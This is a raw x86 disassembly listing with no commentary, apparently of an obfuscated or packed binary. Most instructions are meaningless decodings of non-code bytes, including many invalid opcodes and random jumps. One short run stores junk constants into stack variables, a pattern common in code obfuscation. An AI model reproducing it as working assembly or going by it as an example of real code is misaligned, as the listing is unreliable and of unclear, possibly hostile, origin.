  40cd8a:	pop    ebx
  40cd8b:	mov    esi,0x4abd0f1e
  40cd90:	jmp    DWORD PTR [ecx]
  40cd92:	jmp    0x2a6e:0xcd842ae1
  40cd99:	cmp    DWORD PTR ss:[esi],esi
  40cd9c:	xchg   edi,eax
  40cd9d:	fdiv   DWORD PTR [edx-0x4ac65007]
  40cda3:	sub    BYTE PTR [ebx+edi*1-0x179b03e5],0x81
  40cdab:	fsubr  st,st(1)
  40cdad:	das    
  40cdae:	jne    0x40ce06
  40cdb0:	jae    0x40cd86
  40cdb2:	(bad)  
  40cdb3:	in     al,0x9e
  40cdb5:	das    
  40cdb6:	mov    al,ds:0x299a24a5
  40cdbb:	jae    0x40cdcb
  40cdbd:	ins    DWORD PTR es:[edi],dx
  40cdbe:	sub    al,0xfa
  40cdc0:	rcl    DWORD PTR [ecx-0x7fa2d4b0],1
  40cdc6:	mov    esp,0xb6b4bf5d
  40cdcb:	std    
  40cdcc:	std    
  40cdcd:	scas   eax,DWORD PTR es:[edi]
  40cdce:	lahf   
  40cdcf:	loop   0x40cdaa
  40cdd1:	loopne 0x40ce1c
  40cdd3:	aas    
  40cdd4:	mov    ds:0xa4ef63ec,al
  40cdd9:	sub    DWORD PTR [eax+eax*2],ebx
  40cddc:	test   DWORD PTR [ebx+0x2980695f],edi
  40cde2:	mov    ebx,DWORD PTR [eax+edx*1-0x404d87df]
  40cde9:	xor    DWORD PTR [edi],ecx
  40cdeb:	fcmovbe st,st(0)
  40cded:	lock inc edi
  40cdef:	nop
  40cdf0:	xor    eax,0xea102d22
  40cdf5:	mov    BYTE PTR [eax+0x19cd618e],bl
  40cdfb:	xchg   edi,eax
  40cdfc:	jmp    0xa774:0x6a70354b
  40ce03:	rcr    dl,cl
  40ce05:	popa   
  40ce06:	xlat   BYTE PTR ds:[ebx]
  40ce07:	mov    cl,BYTE PTR [ecx]
  40ce09:	dec    edi
  40ce0a:	nop
  40ce0b:	fcom   st(5)
  40ce0d:	jnp    0x40ce02
  40ce0f:	xor    ebp,eax
  40ce11:	jge    0x40ce13
  40ce13:	(bad)  
  40ce14:	pop    ebp
  40ce15:	cld    
  40ce16:	sbb    eax,0x841eea8b
  40ce1b:	mov    dl,0xbd
  40ce1d:	jnp    0x40ce3e
  40ce1f:	inc    ebx
  40ce20:	scas   al,BYTE PTR es:[edi]
  40ce21:	mov    bl,0xf0
  40ce23:	mov    dl,0xa7
  40ce25:	je     0x40ce99
  40ce27:	mov    ebx,0x378f94e
  40ce2c:	add    al,0xc7
  40ce2e:	mov    edx,0x98e9d690
  40ce33:	out    0x78,al
  40ce35:	mov    ecx,0xfc659661
  40ce3a:	leave  
  40ce3b:	sti    
  40ce3c:	imul   esp,DWORD PTR [esi-0x5f4ed815],0xffffff99
  40ce43:	or     eax,0xac28560d
  40ce48:	in     al,0x6a
  40ce4a:	cmp    BYTE PTR ds:0x9b1b618c,0x65
  40ce51:	jne    0x40cde1
  40ce53:	xchg   esi,eax
  40ce54:	sbb    eax,0x72b622a4
  40ce59:	jb     0x40ce4b
  40ce5b:	pop    esp
  40ce5c:	daa    
  40ce5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ce5e:	xor    BYTE PTR [ecx],al
  40ce60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ce61:	mov    dl,cl
  40ce63:	push   ss
  40ce64:	jmp    0x74cfa3ed
  40ce69:	shl    DWORD PTR [esi-0x3c],1
  40ce6c:	leave  
  40ce6d:	cwde   
  40ce6e:	shl    BYTE PTR [ebx],1
  40ce70:	rol    DWORD PTR [ecx],1
  40ce72:	das    
  40ce73:	sbb    DWORD PTR [edi+0x56],ecx
  40ce76:	inc    esi
  40ce77:	fdivr  DWORD PTR [ebp-0x3251bb77]
  40ce7d:	adc    al,0xca
  40ce7f:	sbb    al,0xfd
  40ce81:	out    0x3,eax
  40ce83:	icebp  
  40ce84:	loopne 0x40ce67
  40ce86:	cs in  al,dx
  40ce88:	add    dl,BYTE PTR [ecx+0x5e]
  40ce8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ce8c:	call   0x5413548c
  40ce91:	adc    al,0x1c
  40ce93:	push   0x2bb992e6
  40ce98:	jecxz  0x40ceb0
  40ce9a:	stos   DWORD PTR es:[edi],eax
  40ce9b:	jmp    0x40ce92
  40ce9d:	lods   al,BYTE PTR ds:[esi]
  40ce9e:	sub    ah,cl
  40cea0:	push   esi
  40cea1:	fsubr  DWORD PTR [ebx]
  40cea3:	sbb    eax,0x965f7d6f
  40cea8:	into   
  40cea9:	(bad)  
  40ceaa:	adc    al,0xc6
  40ceac:	sub    ebp,eax
  40ceae:	push   0xaee0f96c
  40ceb3:	adc    esp,DWORD PTR [eax+ebx*8-0x14]
  40ceb7:	js     0x40cebd
  40ceb9:	mov    al,BYTE PTR [ebp-0x4847ed3c]
  40cebf:	std    
  40cec0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cec1:	fwait
  40cec2:	add    DWORD PTR [ebx+eiz*2],esp
  40cec5:	loope  0x40cefe
  40cec7:	fst    DWORD PTR [ecx+edi*8+0x584ebc0f]
  40cece:	fld    DWORD PTR [ebx-0x15]
  40ced1:	inc    ebx
  40ced2:	jl     0x40ce7f
  40ced4:	dec    ebp
  40ced5:	mov    eax,ds:0xf2b02fd5
  40ceda:	xchg   edx,eax
  40cedb:	sti    
  40cedc:	dec    edx
  40cedd:	les    ebp,FWORD PTR [edx+0x5a9d34c4]
  40cee3:	repz iret 
  40cee5:	out    0x3c,al
  40cee7:	push   eax
  40cee8:	in     al,0x5b
  40ceea:	(bad)  
  40ceeb:	jns    0x40cef1
  40ceed:	inc    ebp
  40ceee:	pavgw  mm6,mm7
  40cef1:	xor    BYTE PTR [ecx+0x55],0x1
  40cef5:	mov    cl,0xe3
  40cef7:	lock mov cl,0xeb
  40cefa:	pop    ebp
  40cefb:	(bad)  
  40cefc:	jo     0x40cf38
  40cefe:	mov    al,ds:0xb8991d24
  40cf03:	sbb    al,0xf9
  40cf05:	adc    eax,0x9c1e97fc
  40cf0a:	jle    0x40cee1
  40cf0c:	add    eax,0x694c07fb
  40cf11:	stc    
  40cf12:	xchg   edi,eax
  40cf13:	(bad)  
  40cf14:	xor    eax,0x88222310
  40cf19:	leave  
  40cf1a:	push   0xffffffeb
  40cf1c:	sbb    BYTE PTR [ebx-0x3f7698ad],dh
  40cf22:	push   ebp
  40cf23:	and    eax,DWORD PTR [ebp-0x72f52ab0]
  40cf29:	xchg   esi,eax
  40cf2a:	mov    al,0xa3
  40cf2c:	ja     0x40cf0c
  40cf2e:	jne    0x40cf46
  40cf30:	mov    eax,0xfa0861dc
  40cf35:	adc    eax,0x7a842c6
  40cf3a:	in     al,dx
  40cf3b:	jno    0x40cfa8
  40cf3d:	jae    0x40cf08
  40cf3f:	ror    BYTE PTR [ecx+0x7f],1
  40cf42:	pop    eax
  40cf43:	bound  ebp,QWORD PTR ds:0xacfd1c93
  40cf49:	hlt    
  40cf4a:	arpl   WORD PTR [edx-0x18],si
  40cf4d:	xchg   edi,eax
  40cf4e:	into   
  40cf4f:	(bad)  
  40cf50:	popa   
  40cf51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cf52:	pusha  
  40cf53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cf54:	test   BYTE PTR [ebx+0x22],dh
  40cf57:	fistp  QWORD PTR [ebx+0x4489a113]
  40cf5d:	or     al,0xe5
  40cf5f:	jnp    0x40cf49
  40cf61:	xor    cl,bh
  40cf63:	adc    DWORD PTR [ecx+eiz*4+0x1d095981],edi
  40cf6a:	xor    BYTE PTR ds:0x24f0f76f,ah
  40cf70:	pop    ebx
  40cf71:	in     eax,0x27
  40cf73:	hlt    
  40cf74:	push   edi
  40cf75:	iret   
  40cf76:	sub    eax,0x476908f7
  40cf7b:	pop    edi
  40cf7c:	not    BYTE PTR [edi+0x275e60ba]
  40cf82:	sbb    DWORD PTR [esi-0x4b],esi
  40cf85:	mov    ecx,0xf98a8f6f
  40cf8a:	sbb    bh,BYTE PTR [eax-0x5b]
  40cf8d:	mov    dh,0x65
  40cf8f:	fxch   st(2)
  40cf91:	mov    al,ds:0x1a2373a2
  40cf96:	push   ebx
  40cf97:	aad    0x95
  40cf99:	xor    BYTE PTR [esi-0x77],0xdd
  40cf9d:	mov    edi,edi
  40cf9f:	mov    ecx,0x92091b3b
  40cfa4:	leave  
  40cfa5:	sbb    bl,BYTE PTR [edx+0x2d36109e]
  40cfab:	rcl    DWORD PTR [ecx],0x6e
  40cfae:	xchg   BYTE PTR [ecx],dl
  40cfb0:	dec    edi
  40cfb1:	push   eax
  40cfb2:	cmp    al,0xd8
  40cfb4:	out    0x5d,eax
  40cfb6:	inc    edx
  40cfb7:	cmp    esp,DWORD PTR [esi-0x2c213788]
  40cfbd:	cmp    eax,0x41b86a45
  40cfc2:	lahf   
  40cfc3:	or     edx,ebx
  40cfc5:	das    
  40cfc6:	mov    bh,0x8b
  40cfc8:	enter  0xd3ce,0x31
  40cfcc:	adc    dl,al
  40cfce:	fidivr WORD PTR [edi+esi*4]
  40cfd1:	mov    esp,0x2add4ba8
  40cfd6:	es mov dh,0x56
  40cfd9:	jge    0x40d041
  40cfdb:	mov    esp,0xc062b4b6
  40cfe0:	inc    ebx
  40cfe1:	push   edx
  40cfe2:	loop   0x40cff9
  40cfe4:	sub    BYTE PTR [edx-0x78],bl
  40cfe7:	test   BYTE PTR [ebx+0x3d],bl
  40cfea:	adc    DWORD PTR [eax],0xfffffff8
  40cfed:	or     al,0xa6
  40cfef:	jne    0x40d031
  40cff1:	cld    
  40cff2:	out    0xe5,al
  40cff4:	xchg   esi,eax
  40cff5:	inc    esi
  40cff6:	cmc    
  40cff7:	hlt    
  40cff8:	sbb    DWORD PTR [ecx+0x6f8ff42b],esi
  40cffe:	ret    0xfa52
  40d001:	xor    cl,BYTE PTR [esp+edi*4-0x4214c94c]
  40d008:	inc    ecx
  40d009:	popf   
  40d00a:	fucomi st,st(3)
  40d00c:	pop    eax
  40d00d:	push   ds
  40d00e:	loope  0x40cfc3
  40d010:	add    BYTE PTR [ecx+0x35df6f63],bl
  40d016:	jnp    0x40cfbd
  40d018:	mov    ds,WORD PTR ds:0xc2462308
  40d01e:	mov    fs,WORD PTR [edx]
  40d020:	rcr    DWORD PTR [esi+0x223402ba],cl
  40d026:	jb     0x40cfe5
  40d028:	mov    bl,0x83
  40d02a:	in     eax,0x6e
  40d02c:	cmc    
  40d02d:	dec    ecx
  40d02e:	(bad)  
  40d02f:	cdq    
  40d030:	or     al,0xaa
  40d032:	popf   
  40d033:	mov    dl,0x6c
  40d035:	popf   
  40d036:	mov    bl,0x32
  40d038:	pop    ss
  40d039:	fidiv  DWORD PTR [esi]
  40d03b:	cmp    BYTE PTR [eax+0x230bbe7f],dl
  40d041:	sub    al,0x7e
  40d043:	das    
  40d044:	(bad)  
  40d046:	push   es
  40d047:	cmp    DWORD PTR [edx-0x36ed8c9a],ebx
  40d04d:	jg     0x40cff7
  40d04f:	xchg   BYTE PTR [edx+0x5c5863f9],ah
  40d055:	xchg   ebp,eax
  40d056:	(bad)  [ebx+0x3d221ffa]
  40d05c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d05d:	inc    ecx
  40d05e:	(bad)  
  40d05f:	(bad)  
  40d060:	jg     0x40d057
  40d062:	hlt    
  40d063:	inc    esp
  40d064:	and    eax,0x3a27916d
  40d069:	neg    DWORD PTR [ebx]
  40d06b:	dec    ecx
  40d06c:	scas   al,BYTE PTR es:[edi]
  40d06d:	cdq    
  40d06e:	xchg   edi,eax
  40d06f:	sbb    edx,edi
  40d071:	dec    ebp
  40d072:	or     DWORD PTR [esi+0x5b],0xfd9a43e4
  40d079:	mov    edi,0xab690473
  40d07e:	sub    eax,0x43b634f5
  40d083:	pop    edi
  40d084:	neg    BYTE PTR [ebx]
  40d086:	sub    eax,0xfa13fb8
  40d08b:	retf   
  40d08c:	or     DWORD PTR [eax+0x5a356e02],esi
  40d092:	outs   dx,DWORD PTR ds:[esi]
  40d093:	dec    ebx
  40d094:	test   BYTE PTR [edx],al
  40d096:	push   edi
  40d097:	mov    dh,0xb8
  40d099:	gs push eax
  40d09b:	scas   eax,DWORD PTR es:[edi]
  40d09c:	out    0x65,al
  40d09e:	mov    ebp,0xdb46a705
  40d0a3:	xchg   esp,eax
  40d0a4:	sar    BYTE PTR [ecx],cl
  40d0a6:	and    edi,0xdf5a21ad
  40d0ac:	mov    edx,0x42f8c555
  40d0b1:	inc    esi
  40d0b2:	imul   edx,DWORD PTR [edx],0x160d2d49
  40d0b8:	mov    esp,0x82b9de04
  40d0bd:	fsubr  DWORD PTR [ebx+0x48983894]
  40d0c3:	lods   al,BYTE PTR ds:[esi]
  40d0c4:	or     DWORD PTR [eax+0x74],esp
  40d0c7:	int    0x7f
  40d0c9:	pop    edx
  40d0ca:	clc    
  40d0cb:	sub    DWORD PTR [si],0xe045897f
  40d0d2:	adc    edx,0x5a
  40d0d5:	mov    DWORD PTR [ebp-0x1c],edx
  40d0d8:	mov    DWORD PTR [ebp-0x80],0xfa4
  40d0df:	mov    DWORD PTR [ebp-0x70],0x618e
  40d0e6:	mov    DWORD PTR [ebp-0x6c],0x811
  40d0ed:	mov    DWORD PTR [ebp-0x98],0x42d6904a
  40d0f7:	mov    DWORD PTR [ebp-0x94],0xe82c1
  40d101:	mov    DWORD PTR [ebp-0x88],0x58ff
  40d10b:	mov    DWORD PTR [ebp-0x84],0x7394
  40d115:	xor    eax,eax
  40d117:	inc    eax
  40d118:	mov    DWORD PTR [ebp-0x64],eax
  40d11b:	mov    DWORD PTR [ebp-0x8],0x5f59
  40d122:	mov    DWORD PTR [ebp-0x4],0x652b
  40d129:	mov    DWORD PTR [ebp-0xc],0xf43
  40d130:	mov    DWORD PTR [ebp-0x14],0x22dc
  40d137:	mov    DWORD PTR [ebp-0x2c],0x45d4
  40d13e:	mov    DWORD PTR [ebp-0x30],0x28e1
  40d145:	mov    DWORD PTR [ebp-0x7c],0x5e09
  40d14c:	mov    DWORD PTR [ebp-0x50],0x3910
  40d153:	mov    DWORD PTR [ebp-0x3c],0x5c97
  40d15a:	mov    DWORD PTR [ebp-0x24],0x6111
  40d161:	mov    DWORD PTR [ebp-0x78],ecx
  40d164:	mov    DWORD PTR [ebp-0x34],ecx
  40d167:	mov    DWORD PTR [ebp-0x44],0x207a
  40d16e:	mov    DWORD PTR [ebp-0x60],eax
  40d171:	mov    DWORD PTR [ebp-0x8c],0x7840
  40d17b:	mov    DWORD PTR [ebp-0x4c],0x6b0b
  40d182:	mov    eax,DWORD PTR [ebp-0x30]
  40d185:	or     eax,0x70c5
  40d18a:	add    eax,DWORD PTR [ebp-0x2c]
  40d18d:	mov    ecx,DWORD PTR [ebp-0x14]
  40d190:	or     eax,ecx
  40d192:	mov    ecx,0xce40
  40d197:	sub    ecx,eax
  40d199:	jmp    0x40d5a4
  40d19e:	imul   eax,ebx,0xb67c365b
  40d1a4:	lods   al,BYTE PTR ds:[esi]
  40d1a5:	xchg   esp,eax
  40d1a6:	adc    dl,0x9e
  40d1a9:	nop
  40d1aa:	push   es
  40d1ab:	push   edi
  40d1ac:	adc    BYTE PTR [esi-0x4141186f],bl
  40d1b2:	xchg   edx,eax
  40d1b3:	les    edi,FWORD PTR [esi+0x41037be]
  40d1b9:	mov    esi,DWORD PTR [eax+0x7deab218]
  40d1bf:	jmp    0x33ce7c20
  40d1c4:	out    dx,al
  40d1c5:	arpl   WORD PTR [esi],cx
  40d1c7:	or     BYTE PTR [edi-0x42],ch
  40d1ca:	stc    
  40d1cb:	dec    edx
  40d1cc:	ret    
  40d1cd:	jp     0x40d165
  40d1cf:	inc    eax
  40d1d0:	mov    bl,0xa
  40d1d2:	jb     0x40d224
  40d1d4:	mov    WORD PTR [ecx+0x3e],?
  40d1d7:	add    eax,0x2b7a902a
  40d1dc:	pop    ebx
  40d1dd:	add    al,0xf2
  40d1df:	ss gs cmp dl,bh
  40d1e3:	(bad)  
  40d1e4:	(bad)  
  40d1e5:	sahf   
  40d1e6:	xor    eax,edx
  40d1e8:	fsubr  DWORD PTR [esi-0xf]
  40d1eb:	ja     0x40d1eb
  40d1ed:	fld    DWORD PTR [eax+0xb]
  40d1f0:	dec    esi
  40d1f1:	call   0x15d4cb91
  40d1f6:	cmp    ebp,DWORD PTR [ecx-0x70]
  40d1f9:	jle    0x40d264
  40d1fb:	cwde   
  40d1fc:	test   BYTE PTR [eax],cl
  40d1fe:	ror    ebp,0x6c
  40d201:	mov    ebp,0x7d2af2d9
  40d206:	adc    ebp,ebx
  40d208:	out    dx,al
  40d209:	in     eax,0xc0
  40d20b:	aad    0x50
  40d20d:	sbb    eax,0x5e02540a
  40d212:	call   0x51c3f32c
  40d217:	jp     0x40d1f6
  40d219:	loop   0x40d1d6
  40d21b:	popa   
  40d21c:	and    eax,0x1cd9f293
  40d221:	shl    DWORD PTR [esi-0x5dc63744],cl
  40d227:	and    al,0x8
  40d229:	and    eax,0x1d34dd55
  40d22e:	inc    eax
  40d22f:	repz jae 0x40d1ee
  40d232:	cmc    
  40d233:	fbld   TBYTE PTR [ebx+0x3951ead8]
  40d239:	push   0x6c
  40d23b:	imul   BYTE PTR [eax-0x19]
  40d23e:	jbe    0x40d292
  40d240:	dec    eax
  40d241:	adc    bh,ah
  40d243:	les    edx,FWORD PTR [eax+ebp*1]
  40d246:	xor    edx,ebx
  40d248:	inc    esi
  40d249:	sub    al,dh
  40d24b:	mov    ebx,0xea083aea
  40d250:	loope  0x40d257
  40d252:	add    DWORD PTR [edx],esi
  40d254:	mov    bl,0xc1
  40d256:	jno    0x40d26c
  40d258:	jb     0x40d210
  40d25a:	sub    al,0xc7
  40d25c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d25d:	out    0x8c,al
  40d25f:	rcl    DWORD PTR [ebx-0x6d2b16cd],cl
  40d265:	iret   
  40d266:	rcr    ah,0x70
  40d269:	lods   al,BYTE PTR ds:[esi]
  40d26a:	cmp    dl,BYTE PTR [ebx+ebp*4]
  40d26d:	ins    DWORD PTR es:[edi],dx
  40d26e:	xchg   DWORD PTR [edi-0xd],ecx
  40d271:	dec    ecx
  40d272:	pop    esp
  40d273:	daa    
  40d274:	or     bh,BYTE PTR [ecx+0x21708804]
  40d27a:	(bad)  
  40d27b:	ret    0x57b4
  40d27e:	fidivr DWORD PTR [esi]
  40d280:	xchg   DWORD PTR ds:0x2da3d895,esi
  40d286:	mov    eax,0x8e3abdd3
  40d28b:	cld    
  40d28c:	(bad)  
  40d28d:	out    0x1f,eax
  40d28f:	mov    edx,0x75c2b64b
  40d294:	lahf   
  40d295:	and    ch,BYTE PTR [ebp-0x78]
  40d298:	xor    al,0xf0
  40d29a:	jne    0x40d316
  40d29c:	loop   0x40d2ed
  40d29e:	std    
  40d29f:	sub    cl,BYTE PTR [ebx+0x79]
  40d2a2:	jno    0x40d269
  40d2a4:	pop    edx
  40d2a5:	pop    ebp
  40d2a6:	adc    ch,BYTE PTR [ecx-0x20]
  40d2a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d2aa:	mov    esi,0x7b5b2d72
  40d2af:	lea    esi,[edx]
  40d2b1:	call   0xd57d:0xce85a99f
  40d2b8:	xor    eax,0x15f2d4a9
  40d2bd:	ss cli 
  40d2bf:	enter  0x7d25,0x7b
  40d2c3:	inc    esp
  40d2c4:	cmp    eax,0x98bb64d3
  40d2c9:	repz lock sti 
  40d2cc:	and    DWORD PTR [ebx-0x56],ebp
  40d2cf:	mov    ds:0x9e2fe8fd,al
  40d2d4:	mov    ch,0x36
  40d2d6:	push   ss
  40d2d7:	ret    
  40d2d8:	adc    eax,DWORD PTR [edi-0x64]
  40d2db:	or     cl,BYTE PTR [eax+ecx*4]
  40d2de:	aam    0xcd
  40d2e0:	loopne 0x40d2ad
  40d2e2:	inc    ecx
  40d2e3:	xchg   edx,eax
  40d2e4:	int    0xb4
  40d2e6:	iret   
  40d2e7:	test   al,0xf5
  40d2e9:	add    BYTE PTR [edi],bh
  40d2eb:	lock dec ebx
  40d2ed:	adc    eax,0x8aee4df3
  40d2f2:	push   0xffffffa8
  40d2f4:	pop    ebp
  40d2f5:	cs inc edi
  40d2f7:	js     0x40d35c
  40d2f9:	mov    ds:0x60d79b4f,eax
  40d2fe:	pop    ecx
  40d2ff:	cmp    eax,0x7733bb70
  40d304:	add    eax,edi
  40d306:	xchg   BYTE PTR [edx],bl
  40d308:	iret   
  40d309:	addr16 pop ds
  40d30b:	xchg   esp,eax
  40d30c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d30d:	jae    0x40d2d0
  40d30f:	in     eax,dx
  40d310:	ret    0x94a6
  40d313:	jae    0x40d2ee
  40d315:	shl    ecx,cl
  40d317:	scas   eax,DWORD PTR es:[edi]
  40d318:	(bad)  
  40d319:	mov    al,0x41
  40d31b:	xchg   edx,eax
  40d31c:	cmp    bh,BYTE PTR [edx+ebx*4]
  40d31f:	(bad)  
  40d320:	or     DWORD PTR cs:[edi+0x38],0xffffffe6
  40d325:	adc    BYTE PTR [esi],ch
  40d327:	aam    0x8c
  40d329:	in     eax,0xe8
  40d32b:	xchg   BYTE PTR [esi+0x36],cl
  40d32e:	push   edx
  40d32f:	xor    edx,edx
  40d331:	mov    al,0x96
  40d333:	fs push eax
  40d335:	outs   dx,DWORD PTR ds:[esi]
  40d336:	add    edx,ecx
  40d338:	mov    gs:0xeb2d56af,eax
  40d33e:	push   edx
  40d33f:	pop    ecx
  40d340:	inc    esp
  40d341:	jp     0x40d300
  40d343:	retf   
  40d344:	fyl2xp1 
  40d346:	jno    0x40d379
  40d348:	fstp   TBYTE PTR [esi]
  40d34a:	in     al,dx
  40d34b:	pop    esi
  40d34c:	cs or  DWORD PTR ds:[ebp+0x40],eax
  40d351:	mov    ebx,0x6778b31e
  40d356:	and    cl,al
  40d358:	fcomip st,st(6)
  40d35a:	lock add ecx,0x23
  40d35e:	retf   0x27a1
  40d361:	loope  0x40d345
  40d363:	dec    eax
  40d364:	sbb    bl,dl
  40d366:	xchg   ebp,eax
  40d367:	adc    bl,BYTE PTR [ebp+0x65ccf200]
  40d36d:	cmp    al,0xa7
  40d36f:	gs sub esp,edx
  40d372:	enter  0xb2bb,0xf1
  40d376:	aaa    
  40d377:	mov    ebp,0x681ea96
  40d37c:	jle    0x40d32e
  40d37e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d37f:	in     eax,dx
  40d380:	push   ss
  40d381:	push   es
  40d382:	test   DWORD PTR [esi-0x478611f8],esi
  40d388:	push   esi
  40d389:	mov    esi,0x989ce752
  40d38e:	ret    0xaefe
  40d391:	sub    DWORD PTR [esi],ecx
  40d393:	or     BYTE PTR [ebx-0x7496d328],ch
  40d399:	pop    es
  40d39a:	mov    eax,DWORD PTR [ebx]
  40d39c:	jae    0x40d3c9
  40d39e:	dec    esp
  40d39f:	test   BYTE PTR [ecx-0x3f],al
  40d3a2:	ds jl  0x40d333
  40d3a5:	shr    DWORD PTR gs:[ecx-0x235f2c04],cl
  40d3ac:	jle    0x40d367
  40d3ae:	dec    eax
  40d3af:	xor    eax,0x6cc5ea64
  40d3b4:	xchg   ebx,eax
  40d3b5:	inc    eax
  40d3b6:	mov    cl,0x50
  40d3b8:	mov    bl,0x3b
  40d3ba:	jmp    0x9685e09a
  40d3bf:	add    al,0x27
  40d3c1:	push   ds
  40d3c2:	ins    DWORD PTR es:[edi],dx
  40d3c3:	push   eax
  40d3c4:	xchg   edi,eax
  40d3c5:	cmp    ebx,DWORD PTR [edi-0x4c3add5a]
  40d3cb:	ins    BYTE PTR es:[edi],dx
  40d3cc:	inc    ebp
  40d3cd:	push   edx
  40d3ce:	sub    eax,0xa2a8d13d
  40d3d3:	mov    edi,0xd2ec0ba6
  40d3d8:	xor    eax,0xad3479ce
  40d3dd:	pop    ecx
  40d3de:	imul   ebx,DWORD PTR [ecx-0x38],0x76314274
  40d3e5:	(bad)  
  40d3e6:	fcmovu st,st(1)
  40d3e8:	into   
  40d3e9:	sbb    DWORD PTR [ecx+0x3784c336],edi
  40d3ef:	pop    ds
  40d3f0:	test   al,0x33
  40d3f2:	jnp    0x40d431
  40d3f4:	pop    edx
  40d3f5:	pop    edi
  40d3f6:	xor    BYTE PTR [ebx-0x3bcb557c],al
  40d3fc:	sub    DWORD PTR [eax+ebp*4-0x6f],ebp
  40d400:	out    dx,al
  40d401:	adc    ebx,edi
  40d403:	ror    BYTE PTR [eax],1
  40d405:	fadd   DWORD PTR [ebp+edi*4+0x64f88544]
  40d40c:	ret    0x2201
  40d40f:	jno    0x40d46e
  40d411:	int    0x58
  40d413:	retf   0x686a
  40d416:	pop    esi
  40d417:	in     eax,dx
  40d418:	fdiv   QWORD PTR [ebp-0x18]
  40d41b:	or     al,0xbd
  40d41d:	sbb    DWORD PTR [ecx+edx*8+0x67],edi
  40d421:	lahf   
  40d422:	(bad)  
  40d423:	ja     0x40d423
  40d425:	push   0x5f625eaa
  40d42a:	cmc    
  40d42b:	cmp    dl,BYTE PTR [ebx+0x78]
  40d42e:	nop
  40d42f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d430:	fwait
  40d431:	out    dx,eax
  40d432:	xlat   BYTE PTR ds:[ebx]
  40d433:	mov    esi,0x9c5d4b12
  40d438:	and    eax,0x8d65e176
  40d43d:	test   eax,0x4580fb35
  40d442:	or     ecx,DWORD PTR [eax-0x3db0f742]
  40d448:	sbb    DWORD PTR [ebp+0x5301217c],eax
  40d44e:	mov    dl,0xb1
  40d450:	and    al,0x2e
  40d452:	adc    BYTE PTR [eax+0x77],dh
  40d455:	fdecstp 
  40d457:	xor    esp,DWORD PTR cs:[edi]
  40d45a:	lea    edx,[ebx+0x48e469c2]
  40d460:	xchg   esp,eax
  40d461:	imul   esp,DWORD PTR [ebx+0x57],0x646bbeab
  40d468:	mov    dh,0xd0
  40d46a:	hlt    
  40d46b:	jg     0x40d49c
  40d46d:	mul    DWORD PTR [ebp-0x78657f18]
  40d473:	pusha  
  40d474:	ror    DWORD PTR [edi+0x5f],1
  40d477:	(bad)  
  40d478:	cli    
  40d479:	icebp  
  40d47a:	sbb    edx,DWORD PTR [ecx+0x7b]
  40d47d:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d47f:	(bad)  
  40d480:	pop    eax
  40d481:	popf   
  40d482:	adc    al,0x48
  40d484:	mov    ebx,0x7d47ae2
  40d489:	dec    edi
  40d48a:	enter  0x50a6,0xfc
  40d48e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d48f:	or     dl,bl
  40d491:	push   ss
  40d492:	or     cl,BYTE PTR [ebp-0x5e309656]
  40d498:	cmp    DWORD PTR [ebx+0x1a732f4b],ebx
  40d49e:	jb     0x40d457
  40d4a0:	fsqrt  
  40d4a2:	fsubr  QWORD PTR [esp+ecx*2-0x15]
  40d4a6:	push   cs
  40d4a7:	pop    edi
  40d4a8:	into   
  40d4a9:	lods   al,BYTE PTR ds:[esi]
  40d4aa:	add    BYTE PTR [ebx+0x177df441],0x64
  40d4b1:	and    ch,dh
  40d4b3:	sbb    dh,ah
  40d4b5:	(bad)  
  40d4b6:	xor    ebx,DWORD PTR [esi]
  40d4b8:	add    al,0xcd
  40d4ba:	aad    0x44
  40d4bc:	sub    bh,0xe
  40d4bf:	cmp    eax,edi
  40d4c1:	inc    ebx
  40d4c2:	test   al,0x51
  40d4c4:	cmc    
  40d4c5:	sahf   
  40d4c6:	push   eax
  40d4c7:	(bad)  
  40d4c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d4c9:	dec    edi
  40d4ca:	daa    
  40d4cb:	mov    dh,0xe5
  40d4cd:	dec    eax
  40d4ce:	stc    
  40d4cf:	fmul   DWORD PTR [edi]
  40d4d1:	out    0x59,eax
  40d4d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d4d4:	cmp    DWORD PTR [edi+0x51],edx
  40d4d7:	popa   
  40d4d8:	add    bh,BYTE PTR [ecx-0x2e64fc7b]
  40d4de:	lock mov dl,0x81
  40d4e1:	inc    ecx
  40d4e2:	aam    0x28
  40d4e4:	sbb    BYTE PTR [esi],ah
  40d4e6:	xchg   esp,eax
  40d4e7:	jae    0x40d504
  40d4e9:	dec    esp
  40d4ea:	loopne 0x40d55c
  40d4ec:	mov    edi,0xe3804452
  40d4f1:	add    DWORD PTR [esi-0x3a3d99e2],0xdf4ddf51
  40d4fb:	mov    bl,0x57
  40d4fd:	or     al,0x33
  40d4ff:	xchg   edi,eax
  40d500:	fidivr DWORD PTR [ebp-0x4e]
  40d503:	adc    DWORD PTR [edi],esi
  40d505:	cld    
  40d506:	stc    
  40d507:	es jo  0x40d55a
  40d50a:	mov    ch,0x6a
  40d50c:	pusha  
  40d50d:	inc    edi
  40d50e:	stos   BYTE PTR es:[edi],al
  40d50f:	dec    edi
  40d510:	data16 jge 0x40d4c8
  40d513:	(bad)  
  40d514:	adc    BYTE PTR [ecx],bl
  40d516:	push   edi
  40d517:	mov    ah,0x3
  40d519:	ds inc esi
  40d51b:	pop    ss
  40d51c:	inc    edi
  40d51d:	loop   0x40d584
  40d51f:	push   esi
  40d520:	ds pushf 
  40d522:	inc    ebp
  40d523:	fbstp  TBYTE PTR [eax+0x77a419c1]
  40d529:	std    
  40d52a:	cwde   
  40d52b:	leave  
  40d52c:	nop
  40d52d:	jmp    0x40d503
  40d52f:	cli    
  40d530:	out    0x9f,eax
  40d532:	outs   dx,BYTE PTR ds:[esi]
